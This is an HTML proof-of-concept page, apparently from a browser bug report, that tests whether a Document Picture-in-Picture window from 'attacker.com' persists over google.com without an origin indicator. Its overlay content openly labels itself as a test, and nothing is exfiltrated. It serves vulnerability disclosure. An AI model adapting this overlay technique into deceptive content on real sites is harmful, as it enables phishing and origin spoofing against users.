<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width">
<title>Attacker.com - Document PiP Test</title>
</head>
<body>
<h3>PoC Document PiP - S3 Origin Confusion Test</h3>
<button id="open" style="padding:12px;font-size:16px;">1. Open PiP Window</button>
<br><br>
<a href="https://www.google.com" target="_blank">2. After PiP open, click here go to google.com (trusted)</a>
<p>Expected: PiP should close or show origin "attacker.com"</p>
<p>Bug: PiP persists over google.com without origin</p>

<script>
document.getElementById('open').onclick = async () => {
  if (!('documentPictureInPicture' in window)) {
    alert('Document PiP not supported - need Chrome Desktop 111+');
    return;
  }
  try {
    // Buka Document PiP window
    const pipWin = await documentPictureInPicture.requestWindow({
      width: 500,
      height: 300
    });

    // Isi konten PiP - ini yang bikin S3, tanpa origin indicator
    pipWin.document.body.innerHTML = `
      <style>
        body { margin:0; font-family: sans-serif; background:#fff; }
        .fake-bar { background:#f1f3f4; padding:8px; border-bottom:1px solid #ccc; font-size:12px; }
        .content { padding:20px; text-align:center; }
      </style>
      <div class="fake-bar">This PiP is from attacker.com - but no origin shown in main UI</div>
      <div class="content">
        <h2>Video / Content from attacker.com</h2>
        <p>Now switch tab to google.com</p>
        <p>If this window stays over google.com without "from attacker.com" label = S3 bug</p>
      </div>
    `;
    
    // Copy style biar keliatan
    [...document.styleSheets].forEach(sheet => {
      try {
        const css = [...sheet.cssRules].map(r => r.cssText).join('');
        const style = pipWin.document.createElement('style');
        style.textContent = css;
        pipWin.document.head.appendChild(style);
      } catch(e) {}
    });

  } catch (err) {
    console.error(err);
    alert('Failed: ' + err);
  }
};
</script>
</body>
</html>
